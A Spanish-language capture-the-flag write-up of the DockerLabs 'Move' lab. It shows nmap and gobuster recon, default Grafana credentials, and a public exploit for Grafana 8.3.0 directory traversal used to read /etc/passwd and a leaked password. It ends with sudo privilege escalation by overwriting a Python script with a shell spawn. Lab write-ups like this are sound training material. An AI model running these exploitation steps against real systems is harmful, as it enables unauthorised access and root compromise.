---
title: DockerLabs - Move
summary: "Write-up del laboratorio Move de DockerLabs"
author: elcybercurioso
date: 2025-10-28 12:00
categories: [Post, DockerLabs]
tags: [fácil, grafana, default credentials, directory path traversal, arbitrary file read, credentials leaking, sudo]
media_subpath: "/assets/img/posts/dockerlabs_move"
image:
  path: main.webp
published: true
---

## nmap

```bash
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Move]
└─$ nmap -p- -sS --min-rate 5000 -v -n -Pn 172.17.0.2 -oG allPorts
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-27 20:16 GMT
Initiating ARP Ping Scan at 20:16
Scanning 172.17.0.2 [1 port]
Completed ARP Ping Scan at 20:16, 0.11s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 20:16
Scanning 172.17.0.2 [65535 ports]
Discovered open port 80/tcp on 172.17.0.2
Discovered open port 22/tcp on 172.17.0.2
Discovered open port 3000/tcp on 172.17.0.2
Completed SYN Stealth Scan at 20:16, 9.94s elapsed (65535 total ports)
Nmap scan report for 172.17.0.2
Host is up (0.000031s latency).
Not shown: 65532 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
3000/tcp open  ppp
MAC Address: 02:42:AC:11:00:02 (Unknown)

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 10.32 seconds
           Raw packets sent: 65536 (2.884MB) | Rcvd: 65536 (2.621MB)
```

```bash
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Move]
└─$ nmap -sCV -p22,80,3000 172.17.0.2                             
Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-27 20:17 GMT
Nmap scan report for consolelog.lab (172.17.0.2)
Host is up (0.000058s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 9.6p1 Debian 4 (protocol 2.0)
| ssh-hostkey: 
|   256 77:0b:34:36:87:0d:38:64:58:c0:6f:4e:cd:7a:3a:99 (ECDSA)
|_  256 1e:c6:b2:91:56:32:50:a5:03:45:f3:f7:32:ca:7b:d6 (ED25519)
80/tcp   open  http    Apache httpd 2.4.58 ((Debian))
|_http-server-header: Apache/2.4.58 (Debian)
|_http-title: Apache2 Debian Default Page: It works
3000/tcp open  http    Grafana http
|_http-trane-info: Problem with XML parsing of /evox/about
| http-title: Grafana
|_Requested resource was /login
| http-robots.txt: 1 disallowed entry 
|_/
MAC Address: 02:42:AC:11:00:02 (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.32 seconds
```

## análisis

### puerto 80

Comenzamos buscando recursos disponibles en el servidor web:

```bash
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Move]
└─$ gobuster dir -u "http://172.17.0.2" -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 200 -x .txt,.html,.php
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://172.17.0.2
[+] Method:                  GET
[+] Threads:                 200
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8
[+] Extensions:              txt,html,php
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/maintenance.html     (Status: 200) [Size: 63]
/index.html           (Status: 200) [Size: 10701]
/server-status        (Status: 403) [Size: 275]
Progress: 882228 / 882228 (100.00%)
===============================================================
Finished
===============================================================
```

Encontramos el fichero `maintenance.html`, el cual nos da una pista para más adelante:

![Desktop View](/20251027211831.webp){: width="972" height="589" .shadow}

### puerto 3000

En el puerto 3000 nos encontramos que esta desplegado Grafana:

![Desktop View](/20251027211957.webp){: width="972" height="589" .shadow}

Buscando en internet, nos encontramos que las credenciales por defecto son: `admin:admin`

![Desktop View](/20251027213244.webp){: width="972" height="589" .shadow}

Probamos a ver si podemos acceder, y parece que son correctas, ya que nos salta un formulario para cambia la contraseña por defecto:

![Desktop View](/20251027213010.webp){: width="972" height="589" .shadow}

Al acceder, vemos que la version de Grafana es la 8.3.0:

![Desktop View](/20251027212017.webp){: width="972" height="589" .shadow}

## explotación

Encontramos que la version de Grafana es vulnerable a un ataque `Directory Path Traversal` (movernos dentro de la maquina, pero con expresiones que indicamos en las peticiones al servidor web) y `Arbitrary File Read` (recuperar el contenido de ficheros del sistema):

```bash
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Move]
└─$ searchsploit grafana 8.3.0
-------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                    |  Path
-------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Grafana 8.3.0 - Directory Traversal and Arbitrary File Read                                                                                       | multiple/webapps/50581.py
-------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

El panel de ayuda indica que únicamente debemos aportar el host donde se aloja la version vulnerable de Grafana:

```bash
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Move]
└─$ python3 exploit.py                     
usage: exploit.py [-h] -H HOST
exploit.py: error: the following arguments are required: -H
```

Vemos que efectivamente podemos leer fichero de la maquina víctima, por ejemplo, `/etc/passwd`, donde el único usuario que permite obtener una consola es `freddy`:

```bash
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Move]
└─$ python3 exploit.py -H http://172.17.0.2:3000
Read file > /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:998:998:systemd Network Management:/:/usr/sbin/nologin
systemd-timesync:x:997:997:systemd Time Synchronization:/:/usr/sbin/nologin
messagebus:x:100:101::/nonexistent:/usr/sbin/nologin
ftp:x:101:104:ftp daemon,,,:/srv/ftp:/usr/sbin/nologin
sshd:x:102:65534::/run/sshd:/usr/sbin/nologin
grafana:x:103:105::/usr/share/grafana:/bin/false
freddy:x:1000:1000::/home/freddy:/bin/bash
```

Por otro lado, comprobamos también el fichero de configuración de Grafana para ver si obtenemos algo útil, pero no es el caso:

```bash
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Move]
└─$ python3 exploit.py -H http://172.17.0.2:3000                                          
Read file > /etc/grafana/grafana.ini
...
#################################### Database ####################################
[database]
# You can configure the database connection by specifying type, host, name, user and password
# as separate properties or as on string using the url properties.

# Either "mysql", "postgres" or "sqlite3", it's your choice
;type = sqlite3
;host = 127.0.0.1:3306
;name = grafana
;user = root
# If the password contains # or ; you have to wrap it with triple quotes. Ex """#password;"""
;password =
...
```

Recordemos que nos habían indicado anteriormente que en cierto fichero del sistema hay contenido que nos puede ser útil:

```bash
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Move]
└─$ python3 exploit.py -H http://172.17.0.2:3000
Read file > /tmp/pass.txt
t9sH76gpQ82UFeZ3GXZS
```

En el fichero `/etc/passwd` de la maquina victima vimos que el único usuario que podríamos usar para conectarnos seria `freddy`, por lo que probamos a conectarnos como dicho usuario, y la contrasena que acabamos de conseguir:

```bash
┌──(elcybercurioso㉿kalilinux)-[~/Desktop/DockerLabs/Move]
└─$ ssh freddy@172.17.0.2
The authenticity of host '172.17.0.2 (172.17.0.2)' can't be established.
ED25519 key fingerprint is SHA256:vI77ttzFmsp8NiCsxBpeZipRCZ9MdfkeMJojz7qMiTw.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '172.17.0.2' (ED25519) to the list of known hosts.
freddy@172.17.0.2's password: 
Linux c6b30fd1dfdb 6.16.8+kali-amd64 #1 SMP PREEMPT_DYNAMIC Kali 6.16.8-1kali1 (2025-09-24) x86_64

The programs included with the Kali GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Kali GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
┏━(Message from Kali developers)
┃
┃ This is a minimal installation of Kali Linux, you likely
┃ want to install supplementary tools. Learn how:
┃ ⇒ https://www.kali.org/docs/troubleshooting/common-minimum-setup/
┃
┗━(Run: “touch ~/.hushlogin” to hide this message)
┌──(freddy㉿c6b30fd1dfdb)-[~]
└─$ hostname -I                                                                                                                                                                    
172.17.0.2 

┌──(freddy㉿c6b30fd1dfdb)-[~]
└─$ whoami                                                                                                                                                                         
freddy
```

## escalada de privilegios

Revisando los permisos SUDO del usuario `freddy`, vemos que puede ejecutar el script `/opt/maintenance.py` con permisos `root`:

```bash
┌──(freddy㉿c6b30fd1dfdb)-[~]
└─$ sudo -l
Matching Defaults entries for freddy on c6b30fd1dfdb:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin, use_pty

User freddy may run the following commands on c6b30fd1dfdb:
    (ALL) NOPASSWD: /usr/bin/python3 /opt/maintenance.py
```

El contenido del script mencionado es:

```bash
┌──(freddy㉿c6b30fd1dfdb)-[~]
└─$ cat /opt/maintenance.py
print("Server under beta testing")
```

Al ver los permisos del script, vemos que el propietario es el mismo `freddy`:

```bash
┌──(freddy㉿c6b30fd1dfdb)-[~]
└─$ ls -la /opt/maintenance.py
-rw-r--r-- 1 freddy freddy 35 Mar 29  2024 /opt/maintenance.py
```

En [GTFOBins](https://gtfobins.github.io/gtfobins/python/#sudo) encontramos que podemos llegar a invocar una consola cuando tengamos permisos SUDO:

![Desktop View](/20251027220952.webp){: width="972" height="589" .shadow}

Modificamos el script con el contenido que nos abrirá una consola:

```bash
┌──(freddy㉿c6b30fd1dfdb)-[~]
└─$ cat /opt/maintenance.py 
import os; os.system("/bin/bash")
```

Al ejecutarlo con `sudo`, vemos que obtenemos la consola como el usuario `root`:

```bash
┌──(freddy㉿c6b30fd1dfdb)-[~]
└─$ sudo /usr/bin/python3 /opt/maintenance.py

┌──(root㉿c6b30fd1dfdb)-[/home/freddy]
└─# whoami
root
```